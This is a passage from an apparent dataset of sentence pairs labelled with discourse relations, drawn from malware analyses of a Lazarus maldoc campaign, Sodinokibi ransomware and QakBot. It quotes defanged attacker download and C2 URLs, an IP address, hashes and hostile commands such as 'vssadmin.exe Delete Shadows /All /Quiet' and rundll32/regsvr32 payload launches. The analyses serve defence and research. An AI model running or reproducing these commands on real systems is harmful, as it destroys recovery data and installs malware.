        "S1": "Whenever winword makes any graphical call, the shellcode executes.",
        "S2": "This technique to hijack control flow has also been used by other sophisticated attackers such as FinFisher.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique to hijack control flow has also been used by other sophisticated attackers such as FinFisher.",
        "S2": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "relation": "MISC"
    },
    {
        "S1": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "S2": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "relation": "NEXT"
    },
    {
        "S1": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "S2": "It also retrieves a decoy document from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)",
        "relation": "NEXT"
    },
    {
        "S1": "It also retrieves a decoy document from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)",
        "S2": "The shellcode mainly sets up a periodic beacon out to https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder C:\\WMAuthorization , writing a vbs file (WMVxEncd.vbs) to it, and creating a corresponding Scheduled task to run the vbs file every 20 minutes (fig. 8).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The shellcode mainly sets up a periodic beacon out to https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder C:\\WMAuthorization , writing a vbs file (WMVxEncd.vbs) to it, and creating a corresponding Scheduled task to run the vbs file every 20 minutes (fig. 8).",
        "S2": "shellObj is the Wscript.Shell object that the vbs file uses to execute the beacon command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "shellObj is the Wscript.Shell object that the vbs file uses to execute the beacon command.",
        "S2": "Here, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a renamed mshta.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a renamed mshta.exe.",
        "S2": "Another variant of the campaign uses the lolbin wuauclt.",
        "relation": "MISC"
    },
    {
        "S1": "Another variant of the campaign uses the lolbin wuauclt.",
        "S2": "Earlier variants have used a copy of wmic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Earlier variants have used a copy of wmic.",
        "S2": "Additional vendors have also identified a variant that uses pcalua.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additional vendors have also identified a variant that uses pcalua.exe.",
        "S2": "Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.",
        "relation": "MISC"
    },
    {
        "S1": "The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code.",
        "S2": "The payloads are present as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary launched first and then the decoy document).",
        "relation": "NEXT"
    },
    {
        "S1": "The payloads are present as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary launched first and then the decoy document).",
        "S2": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "relation": "MISC"
    },
    {
        "S1": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "S2": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:",
        "relation": "NEXT"
    },
    {
        "S1": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:",
        "S2": "- Decodes the target file path of the second stage binary payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Decodes the target file path of the second stage binary payload.",
        "S2": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe",
        "relation": "NEXT"
    },
    {
        "S1": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe",
        "S2": "- Decodes the second stage binary in memory and writes it to the %temp%\\.\\lsm.exe file location",
        "relation": "NEXT"
    },
    {
        "S1": "- Decodes the second stage binary in memory and writes it to the %temp%\\.\\lsm.exe file location",
        "S2": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "relation": "NEXT"
    },
    {
        "S1": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "S2": "- Runs the second stage payload using cmd.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "- Runs the second stage payload using cmd.exe.",
        "S2": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "S2": "This way a process enumeration tool cannot find the parent process => Smaller footprint.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This way a process enumeration tool cannot find the parent process => Smaller footprint.",
        "S2": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "relation": "MISC"
    },
    {
        "S1": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "S2": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "relation": "MISC"
    },
    {
        "S1": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "S2": "- Link file command line: <temp_dir_path>\\.\\lsm.exe /haobao",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Link file command line: <temp_dir_path>\\.\\lsm.exe /haobao",
        "S2": "- Link File Name: GoogleUpdate.lnk",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Link File Name: GoogleUpdate.lnk",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": "MISC"
    },
    {
        "S1": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "S2": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "relation": "ELABORATION"
    },
    {
        "S1": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "S2": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "relation": "NEXT"
    },
    {
        "S1": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "S2": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden",
        "relation": "NEXT"
    },
    {
        "S1": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden",
        "S2": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.",
        "relation": "NEXT"
    },
    {
        "S1": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.",
        "S2": "- This activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro aims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened by the user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- This activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro aims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened by the user.",
        "S2": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.",
        "S2": "As part of the implant initialization activities the implant does the following;",
        "relation": "MISC"
    },
    {
        "S1": "As part of the implant initialization activities the implant does the following;",
        "S2": "- Checks the string passed to it through command line",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Checks the string passed to it through command line",
        "S2": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.",
        "S2": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "relation": "NEXT"
    },
    {
        "S1": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "S2": "DLL information.",
        "relation": "MISC"
    },
    {
        "S1": "DLL information.",
        "S2": "During our research, we discovered additional variants of the DLL file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During our research, we discovered additional variants of the DLL file.",
        "S2": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "relation": "ELABORATION"
    },
    {
        "S1": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "S2": "- Copy the unwrapped DLL into new locations in its own memory space.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Copy the unwrapped DLL into new locations in its own memory space.",
        "S2": "- Build imports required by the DLL (based on the IAT of the DLL)",
        "relation": "NEXT"
    },
    {
        "S1": "- Build imports required by the DLL (based on the IAT of the DLL)",
        "S2": "- Call the newly loaded DLL image\u2019s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in the malware process.",
        "relation": "NEXT"
    },
    {
        "S1": "- Call the newly loaded DLL image\u2019s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in the malware process.",
        "S2": "- Call the actual malicious export in the DLL named \u201cCoreDn\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "- Call the actual malicious export in the DLL named \u201cCoreDn\u201d",
        "S2": "All the malicious activities described below are performed by the DLL unless specified otherwise.",
        "relation": "NEXT"
    },
    {
        "S1": "All the malicious activities described below are performed by the DLL unless specified otherwise.",
        "S2": "The implant has the capability of gathering data from the victim\u2019s system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The implant has the capability of gathering data from the victim\u2019s system.",
        "S2": "The following information will be gathered and sent to the command and control server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following information will be gathered and sent to the command and control server.",
        "S2": "- Computer name and currently logged on user\u2019s name, stored in the format <ComputerName> \\ <Username>",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Computer name and currently logged on user\u2019s name, stored in the format <ComputerName> \\ <Username>",
        "S2": "- List of all processes currently running on the system arranged in format <Process Name>\\r",
        "relation": "LIST"
    },
    {
        "S1": "- List of all processes currently running on the system arranged in format <Process Name>\\r",
        "S2": "- The presence of a specific registry key on the system HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt",
        "relation": "LIST"
    },
    {
        "S1": "- The presence of a specific registry key on the system HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt",
        "S2": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "relation": "LIST"
    },
    {
        "S1": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "S2": "This key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control in the HTTP POST request as well (explained in the below).",
        "relation": "NEXT"
    },
    {
        "S1": "This key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control in the HTTP POST request as well (explained in the below).",
        "S2": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "relation": "NEXT"
    },
    {
        "S1": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "S2": "Encode the collected information using a simple byte based XOR operation using the byte key: 0x34.",
        "relation": "NEXT"
    },
    {
        "S1": "Encode the collected information using a simple byte based XOR operation using the byte key: 0x34.",
        "S2": "Base64 encode (standard) the XORed data.",
        "relation": "NEXT"
    },
    {
        "S1": "Base64 encode (standard) the XORed data.",
        "S2": "Again, check for the presence of the Registry Key: HKCU\\Software\\Bitcoin\\Bitcoin-Qt",
        "relation": "NEXT"
    },
    {
        "S1": "Again, check for the presence of the Registry Key: HKCU\\Software\\Bitcoin\\Bitcoin-Qt",
        "S2": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:",
        "relation": "NEXT"
    },
    {
        "S1": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:",
        "S2": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "relation": "NEXT"
    },
    {
        "S1": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "S2": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "S2": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "S2": "The malware first tries to update the HKEY_LOCAL_MACHINE registry key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware first tries to update the HKEY_LOCAL_MACHINE registry key.",
        "S2": "If the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key.",
        "S2": "Value written to registry to achieve persistence on the endpoint:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Spearphishing Attachment (ATT&CK T1193) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi.",
        "S2": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "S2": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "The specific sample analyzed below is Bewerbungsunterlagen_6704760.doc ( SHA-256: fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd , detection rate is only 33/60 as of today).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The specific sample analyzed below is Bewerbungsunterlagen_6704760.doc ( SHA-256: fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd , detection rate is only 33/60 as of today).",
        "S2": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "S2": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "relation": "MISC"
    },
    {
        "S1": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "S2": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "relation": "MISC"
    },
    {
        "S1": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "S2": "Attackers have used the following Initial Access techniques in their other campaigns to deliver Sodinokibi:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Attackers have used the following Initial Access techniques in their other campaigns to deliver Sodinokibi:",
        "S2": "Exploit Public-Facing Application (ATT&CK T1190) : Attackers exploit vulnerabilities in enterprise applications to distribute it, such as the deserialization vulnerability CVE-2019-2725 in Oracle WebLogic Server having a CVSS score of 9.8/10.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Exploit Public-Facing Application (ATT&CK T1190) : Attackers exploit vulnerabilities in enterprise applications to distribute it, such as the deserialization vulnerability CVE-2019-2725 in Oracle WebLogic Server having a CVSS score of 9.8/10.",
        "S2": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "relation": "LIST"
    },
    {
        "S1": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "S2": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "relation": "ELABORATION"
    },
    {
        "S1": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "S2": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "relation": "MISC"
    },
    {
        "S1": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "S2": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.",
        "relation": "LIST"
    },
    {
        "S1": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.",
        "S2": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "relation": "NEXT"
    },
    {
        "S1": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "S2": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).",
        "relation": "ELABORATION"
    },
    {
        "S1": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).",
        "S2": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "S2": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate",
        "S2": "According to the above functions, fU1 = \"hxxp://54.39.233.132/de1.trp\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to the above functions, fU1 = \"hxxp://54.39.233.132/de1.trp\".",
        "S2": "As we know the fU1 and fP1 parameters, we can understand the following function:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we know the fU1 and fP1 parameters, we can understand the following function:",
        "S2": "The second parameter (fU1) is a string value that contains the URL to download, and the third parameter (fP1) is a string value containing the name or full path of the file to create for the download.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second parameter (fU1) is a string value that contains the URL to download, and the third parameter (fP1) is a string value containing the name or full path of the file to create for the download.",
        "S2": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.",
        "S2": "The downloaded file is the Sodinokibi ransomware (SHA-256: 720fbe60f049848f02ba9b2b91926f80ba65b84f0d831a55f4e634c820bd0848, detection rate is 51/69 as of today).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The downloaded file is the Sodinokibi ransomware (SHA-256: 720fbe60f049848f02ba9b2b91926f80ba65b84f0d831a55f4e634c820bd0848, detection rate is 51/69 as of today).",
        "S2": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "S2": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "relation": "MISC"
    },
    {
        "S1": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "S2": "After execution, it runs the following command using cmd.exe (Command-Line Interface, ATT&CK T1059):",
        "relation": "NEXT"
    },
    {
        "S1": "After execution, it runs the following command using cmd.exe (Command-Line Interface, ATT&CK T1059):",
        "S2": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet",
        "relation": "NEXT"
    },
    {
        "S1": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet",
        "S2": "to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490)",
        "relation": "ELABORATION"
    },
    {
        "S1": "to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490)",
        "S2": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "relation": "NEXT"
    },
    {
        "S1": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "S2": "Sigma rules detecting the above actions are given in the Appendix.",
        "relation": "MISC"
    },
    {
        "S1": "Sigma rules detecting the above actions are given in the Appendix.",
        "S2": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "relation": "MISC"
    },
    {
        "S1": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "S2": "It also drops a ransom note in folders that contain encrypted files.",
        "relation": "NEXT"
    },
    {
        "S1": "It also drops a ransom note in folders that contain encrypted files.",
        "S2": "The name of the ransom note is the random extension added to the encrypted files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The name of the ransom note is the random extension added to the encrypted files.",
        "S2": "For example, if the extension is \".1cd8t9ahd5\", the ransom message filename will be called \"1cd8t9ahd5-HOW-TO-DECRYPT.txt\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, if the extension is \".1cd8t9ahd5\", the ransom message filename will be called \"1cd8t9ahd5-HOW-TO-DECRYPT.txt\".",
        "S2": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "S2": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "relation": "NEXT"
    },
    {
        "S1": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "S2": "If you pay the ransom in two days, the cost is halving.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If you pay the ransom in two days, the cost is halving.",
        "S2": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "relation": "MISC"
    },
    {
        "S1": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "S2": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "relation": "ELABORATION"
    },
    {
        "S1": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "S2": "To put it another way, it requires two keys for decryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To put it another way, it requires two keys for decryption.",
        "S2": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "S2": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Qakbot, also known as QBot or Pinkslipbot, is a modular information stealer.",
        "S2": "It has been active since 2007 and primarily used by financially motivated actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It has been active since 2007 and primarily used by financially motivated actors.",
        "S2": "It was initially known as a banking Trojan and a loader using C2 servers for payload delivery; however, its use expanded beyond strictly being a banking trojan.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It was initially known as a banking Trojan and a loader using C2 servers for payload delivery; however, its use expanded beyond strictly being a banking trojan.",
        "S2": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "S2": "The phishing emails alternate between file attachments (T1566.001) and links (T1566.002).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The phishing emails alternate between file attachments (T1566.001) and links (T1566.002).",
        "S2": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "S2": "QakBot email lures are not the most sophisticated; however, by using contextually aware themes that originate from hijacked email chains or potentially compromised accounts within a user\u2019s social circle, they are effective.",
        "relation": "ELABORATION"
    },
    {
        "S1": "QakBot email lures are not the most sophisticated; however, by using contextually aware themes that originate from hijacked email chains or potentially compromised accounts within a user\u2019s social circle, they are effective.",
        "S2": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "S2": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "S2": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "S2": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "S2": "Figure 3 below shows a screenshot of output from the open-source XLMMacroDeobfuscator tool, which decodes obfuscated Excel 4.0 macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 3 below shows a screenshot of output from the open-source XLMMacroDeobfuscator tool, which decodes obfuscated Excel 4.0 macros.",
        "S2": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "S2": "Next, the EXEC function is evaluated which executes \u201crundll32.exe nxckew.wle, DllRegisterServer\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the EXEC function is evaluated which executes \u201crundll32.exe nxckew.wle, DllRegisterServer\u201d.",
        "S2": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "S2": "Both instances are designed to evade sandbox environments that do not supply the expected command line arguments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both instances are designed to evade sandbox environments that do not supply the expected command line arguments.",
        "S2": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "relation": "MISC"
    },
    {
        "S1": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "S2": "Figure 3 below shows improved readability and de-obfuscation of the macro by manually replacing and substituting the cell values and formulas.",
        "relation": "MISC"
    },
    {
        "S1": "Figure 3 below shows improved readability and de-obfuscation of the macro by manually replacing and substituting the cell values and formulas.",
        "S2": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "relation": "ELABORATION"
    },
    {
